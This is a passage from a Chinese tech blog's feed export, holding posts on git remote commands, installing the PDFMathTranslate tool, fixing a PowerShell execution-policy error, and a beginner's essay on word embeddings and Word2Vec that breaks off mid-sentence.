class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="normal">Ω</mi><mi>j</mi></msub><mo>=</mo><mi>t</mi><mi>a</mi><mi>n</mi><mi>h</mi><mo stretchy="false">(</mo><msub><mi mathvariant="bold">W</mi><mi>h</mi></msub><mrow><mo fence="true">(</mo><msub><mi mathvariant="bold">r</mi><mi>j</mi></msub><mo>⊙</mo><msub><mi mathvariant="normal">Ω</mi><mi>S</mi></msub><mo fence="true">)</mo></mrow><mo>+</mo><mrow><mo fence="true">[</mo><msub><mi mathvariant="normal">∇</mi><mi>h</mi></msub><msub><mi mathvariant="normal">e</mi><mi>j</mi></msub><mo>+</mo><msub><mi mathvariant="normal">b</mi><mi>h</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\Omega_{j}=tanh({\bf W}_{h}\left({\bf r}_{j}\odot\Omega_{S}\right)+\left[\nabla_{h}\mathrm{e}_{j}+\mathrm{b}_{h}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord">Ω</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">h</span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathbf" style="margin-right:0.01597em;">W</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathbf">r</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊙</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord">Ω</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mord"><span class="mord">∇</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord"><span class="mord mathrm">e</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">b</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>工具很好用，无限制，非常良心，简直是福祉。</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LaTex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git修改remote地址</title>
      <link href="/2023/12/18/Programmer/git/git%E4%BF%AE%E6%94%B9remote%E5%9C%B0%E5%9D%80/"/>
      <url>/2023/12/18/Programmer/git/git%E4%BF%AE%E6%94%B9remote%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312202212006.png" alt="image-20231220221159980"></p><h1 id="git修改remote地址">git修改remote地址</h1><p>方式1、直接修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote set-url origin xxxxx.git</span><br></pre></td></tr></table></figure><p>方式2、先删后加 ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git remote rm origin</span><br><span class="line">git remote add origin xxxxx.git</span><br></pre></td></tr></table></figure><p>修改默认pull和push分支：</p><p>git branch --set-upstream-to=origin/develop develop<br><code>origin/develop develop</code>为要设置的默认分支</p><h4 id="给本地和远程仓库重命名">给本地和远程仓库重命名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">### 1.重命名本地分支</span><br><span class="line">git branch -m new-name  #如果当前在要重命名的分支</span><br><span class="line">git branch -m old-name new-name #如果当前不在要重命名的分支</span><br><span class="line"></span><br><span class="line">### 2.删除远程旧名称分支并且push新名称分支</span><br><span class="line">git push origin :old-name new-name</span><br><span class="line"></span><br><span class="line">### 3.关联新名称的本地分支和远程分支</span><br><span class="line"> git push origin -u new-name123456789</span><br></pre></td></tr></table></figure><h3 id="修改远程仓库地址">修改远程仓库地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote set-url origin [url]1</span><br></pre></td></tr></table></figure><h4 id="分别查看仓库-local-global-system-的配置信息">分别查看仓库 local global system 的配置信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --local --list</span><br><span class="line">git config --global --list</span><br><span class="line">git config --system --list123</span><br></pre></td></tr></table></figure><h4 id="仓库配置增加用户">仓库配置增加用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --local --add user.name yourname</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PDFMathTranslate</title>
      <link href="/2023/12/18/Tools/pdf%E7%BF%BB%E8%AF%91/"/>
      <url>/2023/12/18/Tools/pdf%E7%BF%BB%E8%AF%91/</url>
      
        <content type="html"><![CDATA[<h2 id="pdfmathtranslate">PDFMathTranslate</h2><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202501102130795.png" alt="image-20250110213037761"></p><p>PDF科学论文翻译和双语比较。</p><p>📊 保留公式、图表、目录和注释（预览）。</p><p>🌐 支持多种语言和多样化的翻译服务。</p><p>🤖 提供命令行工具、交互式用户界面和Docker镜像。</p><h3 id="python环境下安装">python环境下安装</h3><ol><li><p>Python installed (3.8 &lt;= version &lt;= 3.12)</p></li><li><p>Install our package:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pdf2zh</span><br></pre></td></tr></table></figure></li><li><p>Execute translation, files generated in <a href="https://chatgpt.com/share/6745ed36-9acc-800e-8a90-59204bd13444">current working directory</a>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdf2zh document.pdf</span><br></pre></td></tr></table></figure></li></ol><h3 id="docker安装推荐">docker安装（推荐）</h3><ol><li><p>Pull and run:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull byaidu/pdf2zh</span><br><span class="line">docker run -d -p 7860:7860 byaidu/pdf2zh</span><br></pre></td></tr></table></figure></li><li><p>Open in browser:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:7860/</span><br></pre></td></tr></table></figure></li></ol><h2 id="附">附：</h2><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202501102137120.png" alt="image-20250110213748084"></p><table><thead><tr><th>Option</th><th>Function</th><th>Example</th></tr></thead><tbody><tr><td>files</td><td>Local files</td><td><code>pdf2zh ~/local.pdf</code></td></tr><tr><td>links</td><td>Online files</td><td><code>pdf2zh http://arxiv.org/paper.pdf</code></td></tr><tr><td><code>-i</code></td><td><a href="https://github.com/Byaidu/PDFMathTranslate?tab=readme-ov-file#gui">Enter GUI</a></td><td><code>pdf2zh -i</code></td></tr><tr><td><code>-p</code></td><td><a href="https://github.com/Byaidu/PDFMathTranslate/blob/main/docs/ADVANCED.md#partial">Partial document translation</a></td><td><code>pdf2zh example.pdf -p 1</code></td></tr><tr><td><code>-li</code></td><td><a href="https://github.com/Byaidu/PDFMathTranslate/blob/main/docs/ADVANCED.md#languages">Source language</a></td><td><code>pdf2zh example.pdf -li en</code></td></tr><tr><td><code>-lo</code></td><td><a href="https://github.com/Byaidu/PDFMathTranslate/blob/main/docs/ADVANCED.md#languages">Target language</a></td><td><code>pdf2zh example.pdf -lo zh</code></td></tr><tr><td><code>-s</code></td><td><a href="https://github.com/Byaidu/PDFMathTranslate/blob/main/docs/ADVANCED.md#services">Translation service</a></td><td><code>pdf2zh example.pdf -s deepl</code></td></tr><tr><td><code>-t</code></td><td><a href="https://github.com/Byaidu/PDFMathTranslate/blob/main/docs/ADVANCED.md#threads">Multi-threads</a></td><td><code>pdf2zh example.pdf -t 1</code></td></tr><tr><td><code>-o</code></td><td>Output dir</td><td><code>pdf2zh example.pdf -o output</code></td></tr><tr><td><code>-f</code>, <code>-c</code></td><td><a href="https://github.com/Byaidu/PDFMathTranslate/blob/main/docs/ADVANCED.md#exceptions">Exceptions</a></td><td><code>pdf2zh example.pdf -f &quot;(MS.*)&quot;</code></td></tr><tr><td><code>-cp</code></td><td>Compatibility Mode</td><td><code>pdf2zh example.pdf --compatible</code></td></tr><tr><td><code>--share</code></td><td>Public link</td><td><code>pdf2zh -i --share</code></td></tr><tr><td><code>--authorized</code></td><td><a href="https://github.com/Byaidu/PDFMathTranslate/blob/main/docs/ADVANCED.md#auth">Authorization</a></td><td><code>pdf2zh -i --authorized users.txt [auth.html]</code></td></tr><tr><td><code>--prompt</code></td><td><a href="https://github.com/Byaidu/PDFMathTranslate/blob/main/docs/ADVANCED.md#prompt">Custom Prompt</a></td><td><code>pdf2zh --prompt [prompt.txt]</code></td></tr><tr><td><code>--onnx</code></td><td>[Use Custom DocLayout-YOLO ONNX model]</td><td><code>pdf2zh --onnx [onnx/model/path]</code></td></tr><tr><td><code>--serverport</code></td><td>[Use Custom WebUI port]</td><td><code>pdf2zh --serverport 7860</code></td></tr><tr><td><code>--dir</code></td><td>[batch translate]</td><td><code>pdf2zh --dir /path/to/translate/</code></td></tr></tbody></table><h3 id="huggingface镜像">huggingface镜像</h3><p><strong>1. 安装依赖</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U huggingface_hub</span><br></pre></td></tr></table></figure><p><strong>2. 设置环境变量</strong><br><em>Linux</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export HF_ENDPOINT=https://hf-mirror.com</span><br></pre></td></tr></table></figure><p><em>Windows Powershell</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$env:HF_ENDPOINT = &quot;https://hf-mirror.com&quot;</span><br></pre></td></tr></table></figure><p>建议将上面这一行写入 <code>~/.bashrc</code></p><p><strong>3.1 下载模型</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">huggingface-cli download --resume-download gpt2 --local-dir gpt2Copy</span><br></pre></td></tr></table></figure><p><strong>3.2 下载数据集</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">huggingface-cli download --repo-type dataset --resume-download wikitext --local-dir wikitextCopy</span><br></pre></td></tr></table></figure><p>可以添加 <code>--local-dir-use-symlinks False</code> 参数禁用文件软链接，这样下载路径下所见即所得，详细解释请见上面提到的教程。</p><p><a href="https://hf-mirror.com/">HF-Mirror</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PDF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决“无法加载文件&#92;WindowsPowerShell&#92;profile.ps1，因为在此系统上禁止运行脚本”</title>
      <link href="/2023/12/18/issues/powershell/"/>
      <url>/2023/12/18/issues/powershell/</url>
      
        <content type="html"><![CDATA[<h3 id="解决无法加载文件-windowspowershellprofileps1因为在此系统上禁止运行脚本">解决“无法加载文件 ***\WindowsPowerShell\profile.ps1，因为在此系统上禁止运行脚本”</h3><p>在VScode使用anaconda时，提示</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. : 无法加载文件 C:\Users\47370\Documents\WindowsPowerShell\profile.ps1，因为在此系统上禁止运行脚本。有关详</span><br><span class="line">细信息，请参阅 https:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies。</span><br></pre></td></tr></table></figure><p>想了解计算机上的现用执行策略，打开 PowerShell 然后输入：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; get-executionpolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure><p>更改执行策略，以管理员身份打开 PowerShell 输入：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; set-executionpolicy remotesigned</span><br></pre></td></tr></table></figure><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404031041877.webp" alt="img"></p><p>选择“是”，即可。</p><p>如果要更改回Windows 客户端计算机的默认执行策略，则设置为restricted：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set-executionpolicy restricted</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PowerShell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>没有思考过Embedding，不足以谈 AI</title>
      <link href="/2023/12/18/AILearning/DL/%E6%B2%A1%E6%9C%89%E6%80%9D%E8%80%83%E8%BF%87%20Embedding%EF%BC%8C%E4%B8%8D%E8%B6%B3%E4%BB%A5%E8%B0%88%20AI/"/>
      <url>/2023/12/18/AILearning/DL/%E6%B2%A1%E6%9C%89%E6%80%9D%E8%80%83%E8%BF%87%20Embedding%EF%BC%8C%E4%B8%8D%E8%B6%B3%E4%BB%A5%E8%B0%88%20AI/</url>
      
        <content type="html"><![CDATA[<p>和大部分人一样，我对自然语言处理和语言模型的了解从ChatGPT开始。也和大部分人一样，第一次接触就被ChatGPT的能力所震惊 —— 硅基智能确实做到了理解人类的语言。</p><p>我也产生了几乎人人都会有的疑问：怎么做到的？硅基智能潜力是否会远胜于碳基智能？</p><p>在这篇文章中，我并不试图去解释ChatGPT的一切，而是将从原理出发，思考计算机理解语言的关键要素，这些思考落到了一个具体的切入点 —— embedding —— 一个第一眼难以理解但极为关键的东西。</p><p>文章是一个门外汉通过业余的研究和碎片的思考所完成，谬误之处难以避免，欢迎专业的研究人员指正。</p><h3 id="1-编码文字的数字化">1 编码：文字的数字化</h3><p>Embedding 这个词直译为中文是：嵌入，这是让人头秃的两个字 —— 啥是嵌入？嵌入了啥？跟自然语言又有啥关系？</p><p>嵌入的体现形式是一组具有固定长度的数组，或者叫做向量，但它究竟是什么？为什么需要它？它在计算机理解自然语言的过程中扮演的是怎样的角色呢？</p><p>要回答这些问题，不妨先思考：让计算机理解自然语言，我们需要做什么？</p><p>计算的基础是数，而自然语言是文字，因此很容易想到要做的第一步是让文字数字化，为行文方便，我们将这个过程叫做编码。要设计编码的方法，自然需要思考的问题是：哪些性质是编码规则必须要满足的？</p><p>有一条是显然可以给出的：</p><p><strong>性质一：每一个词具有唯一量化值，不同词需要具有不同的量化值</strong></p><p>背后的逻辑不言自明：一词多数，或是多词一数，都会增加计算机理解语言的难度，这种难度就如同多音字或是多义词给人类造成的困难，尽管人类的智慧让我们可以克服这些障碍，但对于仍然处于培育智能阶段的计算机，为它降低一些难度显然是必要的。</p><p>满足性质一的方法非常容易设计，例如：首先穷举出人类所有的文字或词组 —— 这个集合必定是有限集，例如汉字有10万个，辞海收录的词大概60万个，字母有26个，英语单词数小于100万个 ——— 由于是有限集，我们可以给每一个词分配一个固定的数字。</p><p>例如打开一个词典，将遇到的单词依次赋予一个不同的数值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A --&gt; 1</span><br><span class="line">Abandon --&gt; 2</span><br><span class="line">Abnormal --&gt; 3</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这便完成了符合性质一的编码。例如 “Hello World” 这句话就可以作为 ”3942 98783“ 这样的数字序列输入，从而可以被计算机处理。</p><p>但这一方法存在的问题是显然的：</p><p><strong>数的值与词的义是割裂的。</strong></p><p>这种割裂会产生什么问题？可以通过一个简单的例子来思考：在英语中，a 和 an 是完全同质的词，而 a 和 abnormal 则是差异极大的词。如果按照上述编码方式， a 可能会被赋予数值1，abnormal会被赋予数值2，an 会被赋值赋予数值 123 ，这个时候我们可能会发现 a 和 abnormal 似乎在数值上更加靠近，而 a 和 an 这两个同质的词却隔得非常远。这时容易想到要添加一条性质，来确保数字化后的数值与词义之间的关联：</p><p><strong>性质二：词义相近词需要有&quot;相近&quot;的量化值；词义不相近的词量化值需要尽量“远离”。</strong></p><h3 id="2-基于词义的编码">2 基于词义的编码</h3><p>上面的例子中虽然提到了字典编码法会割裂数值和词义，却未能解释为什么数值和词义应该关联 —— 基于直觉的思考会认为这一点是显然的，但模糊的显然容易掩埋值得被清晰梳理的逻辑。我能够想到的原因有两个：</p><ol><li>可以帮助更加高效理解语义；</li><li>允许计算模型的设计有更大的自由度。</li></ol><p>第1条怎么理解？如果说词的数值分布与词义无关，这会使得文本的序列变得过于随机，例如：</p><blockquote><p>句子一：张三在讲话。<br>句子二：李四在发言。</p></blockquote><p>这两句话有着非常强的同质性，但如果对于字/词的编码不符合性质二，这就会使得以上两句话的序列特征会有非常大的差异。以下的例子或许足够直观：</p><p>如果近义词具有相近的量化值，词和值之间的关系或许会是这样，看起来就是相似的形状：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">张 --&gt; 105, 李 --&gt; 99</span><br><span class="line">三 --&gt; 3, 四 --&gt; 4</span><br><span class="line">在 --&gt; 200,</span><br><span class="line">讲话 --&gt; 300, 发言 --&gt; 295</span><br></pre></td></tr></table></figure><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403051151285.jpeg" alt="图片"></p><p>而如果近义词具有不相近的量化值，词和值之间的关系或许会是这样，一眼看上去似乎没什么关系：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">张 --&gt; 33, 李 --&gt; 1</span><br><span class="line">三 --&gt; 5, 四 --&gt; 200</span><br><span class="line">在 --&gt; 45,</span><br><span class="line">讲话 --&gt; 2, 发言 --&gt; 42</span><br></pre></td></tr></table></figure><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403051151296.jpeg" alt="图片"></p><p>换言之，当性质二得到满足时，同义的句子在序列特征上会更加接近，这将有利于计算机而言更高效地理解共性、区分特性；反之则会给计算机制造非常多的困难。难以捕捉同质内容之间的共性，就意味着模型需要更多的参数才能描述同等的信息量，学习的过程显然困难也会更大。OpenAI 的 Jack Rae 在 Standford 的分享 中提到了一个很深刻的理解语言模型的视角：</p><ul><li><strong>语言模型就是一个压缩器。</strong></li></ul><p>这个观点已有不少文章都做了阐释。</p><p>**所有的压缩，大抵都能被概括在以下框架内：提取共性，保留个性，过滤噪声。**带着这个视角去看，就更加容易认识到性质二的必要性。不同词所编码的数值，是否基于词义本身的相似性形成高区分度的聚类，会直接影响到语言模型对于输入数据的压缩效率。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403051151288.jpeg" alt="图片"></p><p>编码值未基于词义形成聚类</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403051151238.jpeg" alt="图片"></p><p>编码值基于词义形成聚类</p><p>第2条怎么理解？</p><p>因为词是离散分布的，而计算模型的输出 —— 除非只使用非常简单的运算并且约束参数的权重 —— 很难恰好落在定义好的量化值中。</p><p>对于神经网络模型，每一个节点、每一层都必须是连续的，否则便无法计算梯度从而无法应用反向传播算法。这两个事实放在一起可能会出现的情况是：词的量化值可以全部是整数，但是语言模型的输出不一定。例如当模型输出 1.5，词表只定义了 1 和 2，这时该如何处理呢？</p><p>我们会希望 1 和 2 都可以，甚至 3 可能也不会太离谱，因此 1 和 2 所代表的词在词义上最好有某种共性，而不是像 “a” 和 “abandon” 一样，几乎找不到词义上的关联。当相近的词聚集到一起，推断出有效输出的概率就会更高。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403051151301.jpeg" alt="图片"></p><p>图片来源：<a href="https://en.wikipedia.org/wiki/Generative_pre-trained_transformer">https://en.wikipedia.org/wiki/Generative_pre-trained_transformer</a></p><p>—— 理解了这一点，GPT模型的最后一层就非常容易理解了。在最后一层之前，推理的对象是以向量形式表征的语义，输出的是代表语义的一个“模糊”的向量。此处“模糊”指的是，这一向量或许并不对应任何一个已知的词。</p><p>因此，整个模型最后需要再做一个推测，基于这个“模糊”的向量所包含的语义信息，在词表中寻找最符合这些特征的词，来作为真正的输出。在 transformer 中，最后的输出是一个概率分布，表示每一个词匹配这一“模糊”向量的概率。</p><p>现在我们知道了性质二是必要的，在考虑这一点的基础上是否有可能再抢救一下字典编码法？比如… 找一本近义词字典，针对相近的词赋予相近的数？</p><p>问题很快也就出现了：A 和 B 词义相似，B 和 C 词义相似，似乎并不意味着 A 和 C 词义也相近。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A = ”Love“，B = ”Passion“，C = &quot;Rage&quot;</span><br><span class="line">A = ”Comedy“，B = ”Play“，C = &quot;Game&quot;</span><br></pre></td></tr></table></figure><p>在这两个案例中，A 和 B 都是接近的，B 和 C 也是接近，但 A 和 C 却不是。问题在哪呢？</p><ul><li><strong>词义的多维性。</strong></li></ul><p>当用一个标量来表示一个词时，词和词之间的关系只能基于两个标量间的差值得到，从而只有“远”和“近”两种状态；但实际情况可能是：两个词只在某些维度上接近。“Love” 和 “Passion” 接近的地方是：情感浓度，都表示存在强烈的情感，但是在情感色彩方面 —— 也就是消极还是积极 —— passion 具有更加中性的色彩，于是同样具有浓烈情感的 “Rage” 也与 “Passion” 相近，但是 “Rage” 的情感色彩却是消极的。</p><p>于是我们需要一个多维的数字形态，很自然会想到使用向量 ——— 对于每一个词，我们可以表达为一组数，而非一个数；这样一来，就可以在不同的维度上定义远近，词与词之间复杂的关系便能在这一高维的空间中得到表达 —— 这，就是 embedding，它的意义也就不言自明了。“嵌入”这个名字太糟糕了，不如叫它“词义向量” 吧；而词义向量所处的空间，可以称为“词义空间”。</p><h3 id="3-如何设计编码器">3 如何设计编码器</h3><p>目前为止，我们已经找到了可以用于表达词义的数字化形式 —— 向量，也知道了一个好的编码方式应当满足的性质。如何设计一套方法，来完成我们所期望的编码，就成了最后的问题。</p><p>一个比较容易想到的方法是，令词义的不同维度和向量不同维度进行关联。例如，对词义的维度进行全面的拆分：名词性、动词性、形容词性、数量特征、人物、主动、被动、情感色彩、情感强度、空间上下、空间前后、空间内外、颜色特征、… 只要维度的数量足够多，一定是可以把词义所包含的信息全都囊括在内；一旦我们给出每一个维度的定义，就可以给出每个词在相应维度上的数值，从而完成词的向量化，并且完美地符合以上给出的两点性质。但这个看似可行的设计，并不具备可实现性。</p><p>首先是要能够囊括所有词义的不同维度，需要维度数量必然是极高的，而要对词义进行这么精细的切分，就非常困难，其次即使切分出来了，要将每个词不同维度的意义赋予有效的数值，哪怕是资深的语言学家恐怕也会难以感到棘手。今天大家所熟知的语言模型中，并没有一个是用这一方式对词进行向量化的。但是这个思想方案却是有意义的，词义向量的不同维度之于计算机，就如同上面我们列举的维度 —— 词性、数量、时间、空间等等 —— 之于人类。</p><p>纯构建的方式不可行，今天我们也已经知道了一套有效的解决办法：神经网络加大数据暴力出奇迹。这套范式的起源于是：Word2Vec。今天语言模型，无一不是基于词义向量，而词义向量真正开始有效，正是从Word2Vec开始。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403051151233.jpeg" alt="图片"></p><p>Word2Vec 的关键是一个重要的洞察、一个极具启发性的角度：</p><p><strong>一个词的意义，可以被它所出现的上下文定义。</strong></p><p>这句话换一种说法又可以表述为：**上下文相似的词在词义上也一定存在相似性。**想一想是不是很有道理？这个观点是语言学家 Zellig Harris 在1954 提出的“Distribution Hypothesis”，随后被广泛接受。Word2Vec 的两类做法分别是：</p><p>中心词 --&gt; 神经网络 --&gt; 上下文</p><p>上下文 --&gt; 神经网络 --&gt; 